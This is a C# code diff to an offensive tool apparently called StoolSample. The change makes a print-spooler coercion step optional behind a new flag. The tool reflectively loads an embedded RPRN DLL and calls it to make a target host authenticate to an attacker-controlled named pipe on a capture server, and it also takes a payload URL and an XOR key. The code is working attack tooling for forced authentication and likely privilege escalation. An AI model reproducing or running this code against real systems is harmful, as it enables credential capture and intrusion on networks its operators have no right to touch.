@@ -9,10 +9,8 @@ namespace StoolSample
     public class StoolSample
     {
         // FYI, there might be reliability issues with this. The MS-RPRN project is more reliable 
-        public static void SpoolUp(string target, string captureServer, string pipeName, string payloadUrl, string xorKey)
+        public static void SpoolUp(string target, string captureServer, string pipeName, string payloadUrl, string xorKey, bool doStool)
         {
-            byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{captureServer}/pipe/{pipeName}");
-            bool ready = false;
 
             Thread layThePipe = new Thread(() =>
             {
@@ -21,11 +19,13 @@ namespace StoolSample
             layThePipe.IsBackground = false;
             layThePipe.Start();
 
+            if (doStool)
+            {
+                byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{target} \\\\{captureServer}/pipe/{pipeName}");
+                Thread.Sleep(2000);
+                RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
+            }
 
-            Thread.Sleep(2000);
-            RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
-            
-            layThePipe.Join();
         }
     }
 }
